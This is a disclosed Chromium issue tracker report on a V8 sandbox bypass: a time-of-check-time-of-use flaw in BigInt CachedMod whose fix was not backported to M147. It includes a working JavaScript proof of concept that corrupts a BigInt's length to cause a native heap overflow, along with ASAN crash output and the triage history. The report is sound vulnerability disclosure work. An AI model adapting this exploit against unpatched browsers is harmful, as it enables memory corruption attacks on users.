# V8 Sandbox Bypass: BigInt CachedMod Native Heap OOB via Corrupted BigInt Length

| Field | Value |
|-------|-------|
| **Issue ID** | [502317122](https://issues.chromium.org/issues/502317122) |
| **Status** | Accepted |
| **Severity** | S4-Minimal |
| **Priority** | P2 |
| **Component** | Blink>JavaScript |
| **Platforms** | Android, Fuchsia, Linux, Mac, Windows, ChromeOS |
| **Reporter** | pi...@gmail.com |
| **Assignee** | jk...@chromium.org |
| **Created** | 2026-04-13 |
| **Bounty** | $5,000.00 |

## Description

---

### Report description

V8 sandbox bypass fix (496618662) not cherry-picked to branch-heads/14.7 (M147 stable)

---

### Bug location

#### Where do you want to report your vulnerability?

Chrome VRP – Report security issues affecting the Chrome browser. [See program rules](https://bughunters.google.com/about/rules/5745167867576320/chrome-vulnerability-reward-program-rules)

---

### The problem

#### Please describe the technical details of the vulnerability

## Summary

The fix for V8 [bug 496618662](https://issues.chromium.org/issues/496618662) (commit `6294f47ea49`, "[sandbox][bigint] Harden CachedMod\_MakeInverse against corruption", [jkummerow@chromium.org](mailto:jkummerow@chromium.org), 2026-03-30) was merged to origin/main and origin/branch-heads/14.8 but has NOT been cherry-picked to origin/branch-heads/14.7 (M147 stable). M147 remains exposed to this sandbox bypass when an attacker has an in-sandbox corruption primitive, per the V8 sandbox threat model.

## Vulnerability mechanism

The commit message states: "Checking the length of a prospective cached divisor when we first see it isn't enough, we must check it again when we create and cache its inverse because in-sandbox corruption could have modified it by then."

This is a TOCTOU (time-of-check-time-of-use) vulnerability in the BigInt CachedMod optimization:

1. When a divisor `y` is first used in modulo, its length is checked against `kMaxCachedModDivisorSize` (32) at `src/objects/bigint.cc:1676-1677`. If `Y.len() <= 32`, it's accepted as a candidate for caching.
2. After 100 modulo operations with the same divisor (`inc_divisor_count() == kCachingThreshold`), the code at line 1672-1674 caches the divisor's inverse by calling `CachedMod_MakeInverse(Y)`.
3. Between step 1 (initial length check) and step 2 (caching at iteration 100), in-sandbox corruption can modify `y`'s bitfield to encode a length exceeding 32 (e.g., 50 digits).
4. `CachedMod_MakeInverse` at `src/bigint/bigint-internal.cc:157` calls `GetSmallScratch()` which returns a fixed 100-digit (800-byte) C++ heap buffer. The inverse computation and subsequent `CachedMod` calls use `scratch_space = A.len() + inv.len()` where `inv.len()` is derived from the corrupted divisor length. When `n > 32`, `scratch_space = 3n + 1 > 100`, and `MultiplySchoolbook` writes past the 800-byte buffer.

The fix adds `SBXCHECK(Y.len() >= 2 && Y.len() <= bigint::Processor::kMaxCachedModDivisorSize)` before `CachedMod_MakeInverse`, re-validating the length at the point of use.

## Cherry-pick gap

| Commit | branch-heads/14.7 (M147) | branch-heads/14.8 |
| --- | --- | --- |
| Fix `6294f47ea49` | MISSING | Present |

#### Impact analysis

## Reproduction

**Build**: V8 14.7.173.18 with `v8_enable_sandbox=true v8_enable_memory_corruption_api=true is_asan=true`

```
./d8 --expose-memory-corruption-api regress-496618662-14.7.js

```

**PoC** (`regress-496618662-14.7.js`):

```
// Flags: --expose-memory-corruption-api
function makeBigInt(nDigits) {
  let result = 0n;
  for (let i = nDigits - 1; i >= 0; i--) {
    result = (result << 64n) | BigInt(i + 1);
  }
  return result;
}

const mem = new DataView(new Sandbox.MemoryView(0, 0x100000000));
const BITFIELD_OFFSET = 4;

let y = makeBigInt(50);
let y_addr = Sandbox.getAddressOf(y);
const original_sign = mem.getUint32(y_addr + BITFIELD_OFFSET, true) & 1;

// Step 1: Corrupt y's length to 30 (under kMaxCachedModDivisorSize=32)
mem.setUint32(y_addr + BITFIELD_OFFSET, (30 << 1) | original_sign, true);

let x = makeBigInt(50);

// Step 2: 99 iterations — divisor count accumulates, initial check passes
for (let i = 0; i < 99; i++) {
  x % y;
}

// Step 3: Corrupt y's length to 50 (exceeds 32 limit)
y_addr = Sandbox.getAddressOf(y);
mem.setUint32(y_addr + BITFIELD_OFFSET, (50 << 1) | original_sign, true);

// Step 4: 100th iteration triggers CachedMod_MakeInverse without re-checking length
x % y;
// Step 5: Subsequent mod uses corrupted cached inverse → OOB write
x % y;

```
## ASAN evidence

```
==64916==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x618000019ba0
WRITE of size 8 at 0x618000019ba0 thread T0
    #0 operator= src/bigint/bigint.h:162:37
    #1 MultiplySchoolbook src/bigint/bigint-inl.h:768:10
    #2 CachedMod src/bigint/bigint-inl.h
    #3 MutableBigInt_AbsoluteModAndCanonicalize src/objects/bigint.cc:1658:40

0x618000019ba0 is located 0 bytes after 800-byte region [0x618000019880,0x618000019ba0)
allocated by:
    GetSmallScratch src/bigint/bigint.h:352:11
    CachedMod_MakeInverse src/bigint/bigint-internal.cc:157:3
    MutableBigInt_AbsoluteModAndCanonicalize src/objects/bigint.cc:1674:20

```

Full ASAN output: `asan_output_F2_496618662.txt`

## Upstream references

- **Bug**: <https://issues.chromium.org/issues/496618662>
- **Fix CL**: <https://chromium-review.googlesource.com/c/v8/v8/+/7706199>
- **Fix commit**: `6294f47ea49`
- **Regression test**: `test/mjsunit/sandbox/regress-496618662.js` (in `sandbox/` directory — expects crash under `--sandbox-testing`, confirming security intent)

## Recommendation

Cherry-pick `6294f47ea49` to branch-heads/14.7.

## Affected versions

- V8 14.7.173.18 (Chrome M147 stable) — VULNERABLE
- V8 main (post `6294f47ea49`) — fixed
- V8 14.8+ — fixed

## Attach list

1. `regress-496618662-14.7.js` — PoC adapted for 14.7
2. `asan_output_F2_496618662.txt` — Full ASAN output showing heap-buffer-overflow WRITE

---

### The cause

#### What version of Chrome have you found the security issue in?

V8 14.7.173.18 (Chrome M147 stable)

#### Is the security issue related to a crash?

Yes, it is related to a crash.

#### Choose the type of vulnerability

Other

#### How would you like to be publicly acknowledged for your report?

Shaul Ben Hai

## Attachments

- [regress-496618662-14.7.js](attachments/regress-496618662-14.7.js) (text/javascript, 1.6 KB)
- [vrp_report_F2_496618662.md](attachments/vrp_report_F2_496618662.md) (text/markdown, 4.8 KB)
- [asan_output_F2_496618662.txt](attachments/asan_output_F2_496618662.txt) (text/plain, 8.5 KB)

## Timeline

### ch...@google.com (2026-04-14)

This V8 bug has been marked as either a release blocker or a vulnerability bug. V8 bugs affect all OSs supported by Chrome, so the OS field has been updated to reflect this. Please update the bug with the correct OS field if it only affects a subset of OSes.

### ch...@google.com (2026-04-14)

Setting milestone because of s0/s1 severity.

### ch...@google.com (2026-04-14)

Setting Priority to P1 to match Severity s1. To ensure SLOs are tracked correctly, priority must match or exceed severity.

### bi...@chromium.org (2026-04-14)

We rely on manual severity assessment for backmerging sandbox escapes. [b/496618662](https://issues.chromium.org/issues/496618662) was not critical enough for being considered to be backmerged into M147.

### ch...@google.com (2026-04-14)

This issue has been closed as an incomplete or invalid report and we will not respond to further comments. If you can improve your report please open a fresh issue that addresses any feedback provided.

For more information on our vulnerability policies, please refer to <https://chromium.googlesource.com/chromium/src/+/main/docs/security/severity-guidelines.md>

### ch...@google.com (2026-07-22)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/502317122)*
